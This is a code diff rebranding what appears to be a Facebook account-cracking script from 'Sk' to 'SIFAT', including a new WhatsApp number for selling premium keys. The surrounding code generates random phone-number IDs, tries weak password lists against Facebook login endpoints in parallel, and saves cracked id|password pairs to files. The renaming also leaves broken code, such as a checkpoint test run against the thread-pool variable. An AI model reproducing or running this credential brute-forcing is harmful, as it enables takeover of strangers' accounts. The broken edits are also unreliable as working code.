@@ -667,7 +667,7 @@ def public():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python Sk.py')
+                os.system('python RANDOM.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
         except (KeyError,IOError):
@@ -786,12 +786,12 @@ def menu():
                         linex()
                         print(" Your Subscription Date Expire")
                         linex()
-                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
+                        url_wa = "https://api.whatsapp.com/send?phone=+8801701613050&text="
                         name = input(" Enter your Name : ")
                         linex()
-                        tks = ("Hi Sk Sir, I Need To Buy Your Paid Sk PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
+                        tks = ("Hi SIFAT Sir, I Need To Buy Your Paid ZX PRO Tools Version 1.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                         subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
-                        print(' Run :  python Sk.py')
+                        print(' Run :  python ZX-RANDIM.py')
                         exit()
         except ValueError:
                 exit()
@@ -810,7 +810,7 @@ def pak():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
                         user.append(nmp)
-                with tred(max_workers=30) as Sk:     
+                with tred(max_workers=30) as SIFAT:     
                         clear()
                         tl = str(len(user))
                         print('Total account : \033[1;32m'+tl)
@@ -820,7 +820,7 @@ def pak():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
-                                Sk.submit(rndm,ids,passlist)
+                                SIFAT.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
                 print(' The process has completed')
@@ -840,7 +840,7 @@ def bd():
                 for nmbr in range(limit):
                         nmp = ''.join(random.choice(string.digits) for _ in range(8))
                         user.append(nmp)
-                with tred(max_workers=30) as Sk:     
+                with tred(max_workers=30) as SIFAT:     
                         clear()
                         tl = str(len(user))
                         print(' Total account : \033[1;32m'+tl)
@@ -857,7 +857,7 @@ def bd():
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python Sk.py')
+                os.system('python RANDOM.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
@@ -905,7 +905,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                Sk.submit(rndm,ids,passlist)
+                                SIFAT.submit(rndm,ids,passlist)
                 print('\033[1;97m')
                 linex()
                 print(' The process has completed')
@@ -936,11 +936,11 @@ def ffb(ids,names,passlist):
                         if "c_user" in Sk:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m SK-OK %s | %s'%(ids,pas))
-                                open('/sdcard/SK-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m SIFAT-OK %s | %s'%(ids,pas))
+                                open('/sdcard/SIFAT-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in Sk:
+                        elif 'checkpoint' in SIFAT:
                                 if 'y' in pcp:
                                         print('\r\033[1;91m SK-CP '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -1007,14 +1007,14 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m SK-OK '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m SIFAT-OK '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SIFAT-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\033[1;91m SK-CP '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/Sk-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\033[1;91m SIFAT-CP '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/SIFAT-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
